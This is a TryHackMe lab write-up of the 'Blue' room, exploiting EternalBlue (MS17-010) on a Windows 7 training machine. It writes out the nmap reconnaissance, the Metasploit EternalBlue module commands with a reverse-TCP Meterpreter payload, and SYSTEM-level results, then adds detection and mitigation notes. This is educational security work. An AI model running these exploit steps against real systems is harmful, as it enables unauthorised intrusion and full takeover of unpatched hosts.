# TryHackMe: Blue — Write-up

## Overview
"Blue" is a beginner-friendly TryHackMe room that focuses on exploiting **MS17-010 (EternalBlue)**, a critical SMB vulnerability in Windows systems. This same vulnerability was famously used in the 2017 WannaCry ransomware attack. The goal of this room is to gain remote access to a Windows 7 machine by identifying and exploiting this flaw, then escalating to full system-level privileges.

**Target:** Windows 7 Professional (JON-PC)
**Skills demonstrated:** Network scanning, vulnerability identification, exploitation with Metasploit, privilege escalation, post-exploitation enumeration

---

## 1. Reconnaissance

Started with an Nmap scan to identify open ports and running services on the target machine.

```bash
nmap -sV -sC 10.48.183.201
```

**Key findings:**
- **OS:** Windows 7 Professional 7601, Service Pack 1
- **Computer name:** JON-PC
- **Open ports included:**
  - `445/tcp` — microsoft-ds (SMB)
  - `139/tcp` — NetBIOS
  - `3389/tcp` — RDP (tcpwrapped)
  - Multiple `49152–49165/tcp` — Microsoft Windows RPC
- **SMB security mode:** message signing disabled (flagged by Nmap as "dangerous, but default")

The combination of an outdated Windows 7 OS with SMB exposed on port 445 and weak SMB security settings strongly suggested the machine was vulnerable to **EternalBlue (MS17-010)**.

---

## 2. Exploitation

Used the Metasploit Framework to search for and load the EternalBlue exploit module.

```bash
msfconsole
search eternalblue
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.48.183.201
run
```

Metasploit automatically selected the default payload (`windows/x64/meterpreter/reverse_tcp`). After running the exploit, a **Meterpreter session** was successfully established, granting remote access to the target machine.

*Note: Initial exploitation attempts resulted in a few unstable sessions closing immediately ("Reason: Died") — a known behavior with EternalBlue exploitation, often related to service crash/restart timing. A stable session was obtained on a following attempt.*

---

## 3. Post-Exploitation / Privilege Verification

Once inside the Meterpreter session, ran basic enumeration commands to confirm access level.

```bash
sysinfo
getuid
```

**Results:**
```
Computer        : JON-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1)
Architecture    : x64
Server username : NT AUTHORITY\SYSTEM
```

The `getuid` output confirms **NT AUTHORITY\SYSTEM** access — the highest privilege level on a Windows machine. This means the exploit not only granted remote code execution but landed directly at SYSTEM level, with no additional privilege escalation steps required.

---

## 4. Blue Team / Detection Perspective

From a defensive standpoint, this attack would generate several detectable indicators:
- **SMB traffic anomalies** — repeated connection attempts to port 445 from a single external host, especially with malformed or unusual packet structures typical of EternalBlue's exploitation technique
- **Unexpected process spawning** — a `services.exe` or `lsass.exe`-related process spawning a new process (e.g., a shell) is a classic EternalBlue post-exploitation indicator
- **Windows Event Logs** — Event ID 4624 (successful logon) with an unusual logon type, combined with SMB service crash/restart events, would be worth alerting on
- **Mitigation:** This vulnerability is patched by **MS17-010**. Disabling SMBv1 entirely and ensuring the "message signing" setting is enforced (not just enabled) would prevent this style of attack.

A SOC analyst monitoring this environment should have SMB traffic on ports 445/139 flagged for anomaly detection, and unpatched legacy systems like Windows 7 should be flagged for the vulnerability management team as a critical patch priority.

---

## Lessons Learned
- Reinforced how outdated, unpatched systems remain a major real-world attack vector, even years after a patch (MS17-010) has been available.
- Practiced the full attack chain: recon → vulnerability identification → exploitation → privilege verification.
- Learned to think from a defender's perspective — not just how the exploit works, but what it would look like in logs and how a SOC analyst could detect and prevent it.

---

**Tools used:** Nmap, Metasploit Framework (msfconsole), Meterpreter
**Platform:** TryHackMe — Room: [Blue](https://tryhackme.com/room/blue)
